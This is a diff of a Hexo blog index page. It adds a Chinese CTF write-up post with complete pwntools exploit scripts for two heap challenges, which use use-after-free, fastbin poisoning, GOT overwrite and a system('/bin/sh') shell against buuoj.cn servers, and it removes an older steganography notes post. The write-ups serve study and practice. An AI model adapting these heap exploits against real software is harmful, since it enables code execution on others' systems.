@@ -257,6 +257,155 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/27/week1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Archerの博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/07/27/week1/" itemprop="url">week1</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-27T10:02:00+08:00">
+                2021-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1-wustctf2020-easyfast"><a href="#1-wustctf2020-easyfast" class="headerlink" title="1.wustctf2020_easyfast"></a>1.wustctf2020_easyfast</h3><p>这个题思路很简单，只要把0x602090改为0就可以了，可以直接通过uaf和fastbinattack，在0x6020080处分配内存，但是这个地方理论上是分配不了的，因为大小为0x50,后一位是0，待解决</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">1</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">1</span>):</span><br><span class="line">	p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28425</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size&gt;\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index&gt;\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;choice&gt;\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index&gt;\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">	p.send(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys_ad=0x602090</span></span><br><span class="line">sys_ad=<span class="number">0x4008A6</span></span><br><span class="line">ad=<span class="number">0x602080</span></span><br><span class="line">allo(<span class="number">0x40</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment">#allo(0x)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(ad))</span><br><span class="line">allo(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line">allo(<span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-ciscn-2019-final-5"><a href="#2-ciscn-2019-final-5" class="headerlink" title="2.ciscn_2019_final_5"></a>2.ciscn_2019_final_5</h3><p>这个题有点东西，从下午写到晚上才写出来，主要是犯的错太多了，一开始交互又写错了，浪费了好多时间<br>这个题中索引堆块是通过heap_array中堆地址的最后一位，edit函数中size则是根据idx<br>主要漏洞点在于<br>malloc函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      qword_6020E0[i] = v5;<span class="comment">//v5=index | heap_ad 堆的起始地址位0x250 当index等于16的时候堆的地址,v5 = 0x260,可以伪造一个堆，再free，然后再得到这个堆改别的</span></span><br><span class="line">      <span class="comment">//堆的fd，就可以分配到heap_array(0x6020e0)处，之后就可以随便做了，一开始我没分配到heap_array,做了好久也没做出来</span></span><br><span class="line">      result = i;</span><br><span class="line">      dword_602180[i] = v2;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>free函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( result == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)(qword_6020E0[i] &amp; <span class="number">0xFFFFFFFFFFFFFFF0</span>LL));</span><br><span class="line">      qword_6020E0[i] = <span class="number">0LL</span>;</span><br><span class="line">      dword_602180[i] = <span class="number">0</span>;</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;free success.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>思路:先分配一个0x10的堆，然后内容为伪造的堆块的内容，此时再分配一个大堆块(可以覆盖到heap_array的大小)，然后free掉大的和伪造的，此时<br>再分配我们伪造的堆块的大小，就能得到伪造的堆块，此时再修改大堆块的fd为0x6020e0，后面的操作就比较常规了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28896</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allo</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">	p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">	p.send(con)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">16</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line">allo(<span class="number">1</span>,<span class="number">0xc0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">allo(<span class="number">2</span>,<span class="number">0x40</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(<span class="number">0x6020e0</span>))</span><br><span class="line">allo(<span class="number">3</span>,<span class="number">0xc0</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">allo(<span class="number">4</span>,<span class="number">0xc0</span>,p64(elf.got[<span class="string">&quot;free&quot;</span>]&amp;<span class="number">0xffffffffffffff10</span>)+p64(elf.got[<span class="string">&quot;alarm&quot;</span>]|<span class="number">1</span>)+p64(elf.got[<span class="string">&quot;atoi&quot;</span>])+p64(<span class="number">0</span>)*<span class="number">17</span>+p32(<span class="number">0x30</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&quot;puts&quot;</span>])*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">ad=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.info(<span class="string">&quot;ad: &quot;</span>+<span class="built_in">hex</span>(ad))</span><br><span class="line"></span><br><span class="line">libc_base=ad-libc.sym[<span class="string">&quot;alarm&quot;</span>]&amp;<span class="number">0xffffffffffffff00</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_ad=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.info(<span class="string">&quot;sys_ad: &quot;</span>+<span class="built_in">hex</span>(sys_ad))</span><br><span class="line">edit(<span class="number">8</span>,p64(sys_ad)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/06/%E5%A0%86%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1649,165 +1798,13 @@ a.确定canary的偏移量
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/22/misc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Archerの博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/12/22/misc/" itemprop="url">misc</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-22T16:10:30+08:00">
-                2020-12-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/misc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
-                    <span itemprop="name">misc学习笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>hexo更新博客命令<br>d:···cd blog····hexo clean····hexo g····hexo s····hexo d<br>做题流程：静图的话，看属性，有没有给隐藏信息，先丢到01 editor然后找flag，无结果丢到用stegsolve看看各通道的图片，然后狗rgb看看有没有其他文件的头，有的话保存为对应的文件，没有的话，丢到kali用binwalk看看有没有隐藏文件，然后用zsteg看看<br>flag格式：可以若得到的flag提交错误，可以修改flag的格式，如把大写改小写，数字替换为英文<br>工具的使用：<br>stegsolve:切到D盘然后用命令java -jar stegsolve.jar打开<br>    File Format:文件格式，这个主要是查看图片的具体信息<br>    Data Extract:数据抽取，图片中隐藏数据的抽取(lsb隐写,rgb零位勾为1，bit order勾为lsb先preview再save bin)<br>    Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看<br>    Image Combiner:拼图，图片拼接<br>jphswin的使用：(jpg,jepg)<br>seek是查找文件中的隐藏信息，输入密码，然后保存为txt文件，txt中的信息即为隐藏信息<br>kali中工具使用的命令<br>binwalk:<br>binwalk+文件名 binwalk -e +文件名(提取文件)<br>binwalk+-D=文件类型+文件名<br>zsteg：zsteg+文件名 zsteg -a +文件名(查看详细信息)<br>steghide：steghide  extract -sf 文件名(图片或音频)需要密码<br>做过的题目类型：<br>1.图类型a:动图：1.flag包含在图中</p>
-<pre><code>    b：静图：1.图片实际大小与展示大小不符，通过01 editor来修改(png图片改IHDR后的数据，ihdr后为宽占4位，如00 00 00 00，然后是高)
-            2.改后缀为txt，然后找flag
-            3.lsb隐写，用stegsolve找信息
-            4.图片里包含其他文件，用binwalk命令为binwalk+文件名，然后用binwalk+-e+文件名提取文件
-            5.图中包含长串2进制数、8进制数、16进制数，然后转字符串
-           2进制转字符串网址：http://www.txttool.com/wenben_binarystr.asp
-           16进制转字符串网站：https://www.bejson.com/convert/ox2str/
-            6.使用stegsolve，rgb0位勾为一，发现有其他文件的头文件，然后save bin保存为对应的文件，(当保存后的文件损坏可以丢到kali，或者使用winzip工具中的修复)然后打开对应的文件可以直接找到flag
-            7.jphs隐写使用工具jphswin
-            8.使用steghide爆破密码
-</code></pre>
-<p>2.压缩包a.真加密：1.用ARCHPR暴力破解(提示四位密码)<br>       b.伪加密，找504B(504B0304是头文件标识，504B0506是目录结束标识)然后将09 00改为00 00(位于504B0102后面一个字节，如504B0102 00000000 09)<br>       c.打开得到无类型的文件，用01editor打开，发现头文件缺失（IHDR,PNG的文件头数据块)<br>3.流量包 1.用wireshark打开找password即为flag<br>        2.追踪http流，过滤器输入http<br>4.宽带包，后缀是.bin，打开routerpassview，然后找关键词，一般密码是用户名或者密码，关键词：user,password,ctf,flag,name…….<br>5.vmdk放虚拟机上用7z解压，命令7z x flag.vmdk -o./<br>常见关键词：password，ctf，flag,user,ctf,passwd,user,name<br>base64转图片网站：<a target="_blank" rel="noopener" href="https://the-x.cn/base64">https://the-x.cn/base64</a><br>提取图片文字网站：<a target="_blank" rel="noopener" href="https://web.baimiaoapp.com/">https://web.baimiaoapp.com/</a><br>在线html生成网站：<a target="_blank" rel="noopener" href="https://repl.it/">https://repl.it/</a><br>pdf生成转换word···网站：<a target="_blank" rel="noopener" href="https://pdf4me.com/zh-hans/repair-pdf/">https://pdf4me.com/zh-hans/repair-pdf/</a><br>解密网站大全：<a target="_blank" rel="noopener" href="https://www.hackliu.com/?p=475">https://www.hackliu.com/?p=475</a><br>常见文件的头和尾<br>JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　文件尾：FF D9<br>PNG (png)，                       　　  文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82<br>GIF (gif)，                           　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：003B<br>ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B 05 06<br>TIFF (tif)，                            文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Windows Bitmap (bmp)，      　          文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：<br>CAD (dwg)，                        　   文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Adobe Photoshop (psd)，                 文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Rich Text Format (rtf)，                文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：<br>XML (xml)，                             文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：<br>HTML (html)，                           文件头：68746D6C3E<br>Email [thorough only] (eml)，           文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，                 文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                         文件头：2142444E<br>MS Word/Excel (xls.or.doc)，            文件头：D0CF11E0<br>MS Access (mdb)，                       文件头：5374616E64617264204A<br>WordPerfect (wpd)，                     文件头：FF575043<br>Adobe Acrobat (pdf)，                   文件头：255044462D312E<br>Quicken (qdf)，                         文件头：AC9EBD8F<br>Windows Password (pwl)，                文件头：E3828596<br>RAR Archive (rar)，                     文件头：52617221<br>Wave (wav)，                            文件头：57415645<br>AVI (avi)，                             文件头：41564920<br>Real Audio (ram)，                      文件头：2E7261FD<br>Real Media (rm)，                       文件头：2E524D46<br>MPEG (mpg)，                            文件头：000001BA<br>MPEG (mpg)，                            文件头：000001B3<br>Quicktime (mov)，                       文件头：6D6F6F76<br>Windows Media (asf)，                   文件头：3026B2758E66CF11<br>MIDI (mid)，                            文件头：4D546864</p>
-<hr>
-<p>strings filename | grep keyword  #在filename中查找keyword</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
+
 
 
           </div>
@@ -1855,7 +1852,7 @@ a.确定canary的偏移量
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
